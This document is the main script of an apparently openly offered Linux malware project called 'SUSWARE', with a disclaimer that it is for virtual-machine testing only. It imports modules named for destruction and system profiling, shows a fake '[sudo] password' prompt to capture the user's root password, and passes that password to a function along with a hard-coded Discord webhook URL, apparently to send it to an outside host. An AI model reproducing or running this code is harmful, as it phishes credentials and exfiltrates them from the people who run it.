from os import getcwd, listdir
from threading import Thread
from colorama import Fore, Style

# Importa los módulos desde src
from src.behavior import * 
from src.destruct import *
from src.pc_info import *
from src.wallpaper import *

print(Fore.GREEN, '''
███████╗██╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝
███████╗██║   ██║███████╗██║ █╗ ██║███████║██████╔╝█████╗  
╚════██║██║   ██║╚════██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚══════╝ ╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
      ''', Fore.RESET)
print()

print(Fore.RED, """
                    ADVERTENCIA DE USO
          Este script puede ser MORTAL para tu pc
          Solo uso de testeos y máquina virtual
          
          No me hago responsable del tipo de daños
          que esto pueda causar si se ejecuta en
          pc física
          
                                        - lVoidi
      """, Fore.RESET)

print(Style.BRIGHT)
print(Fore.CYAN,"""
          Agradecimientos a las siguientes personas
             - Br3fuck → https://github.com/Br3Fuck
             - Chxki   → https://github.com/Ch1KZX
      """)     
print(Style.RESET_ALL)
username = listdir('/home/')[0]

rootPassword = input(f'[sudo] password for {username} ')

user_info(root_pswd=rootPassword,
          webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')

